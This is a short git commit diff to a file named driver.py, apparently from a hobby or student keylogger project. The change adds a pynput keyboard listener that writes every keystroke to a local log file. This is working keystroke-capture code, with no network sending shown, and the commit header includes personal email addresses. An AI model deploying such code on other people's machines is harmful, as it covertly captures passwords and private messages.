f1aeaa58bf30eba1c9a3a3fb291102f05d9a1d73
noname45688@gmail.com <csaunders5@liberty.edu>
2020-07-22 06:39:17 -0400

    added listener

--- driver.py
+++ driver.py
@@ -1,12 +1,18 @@
 from controller_keyboard import control_keyboard
 from controller_mouse import control_mouse
+from pynput.keyboard import Listener
 # Note: pynput cannot control the keyboard and mouse within the same file, this requires double imports
 
 # Program stores key strokes and mouse movement within log file
 
-# Appending
-with open('keylogger/log.txt','a') as f:
-    f.write('')
+# Append
+def appendtofile(key):
+    data = str(key)
+    with open('keylogger/log.txt','a') as f:
+        f.write(data)
 
-control_mouse()
-control_keyboard()
+
+
+with Listener(on_press=appendtofile) as l:
+    l.join()
+
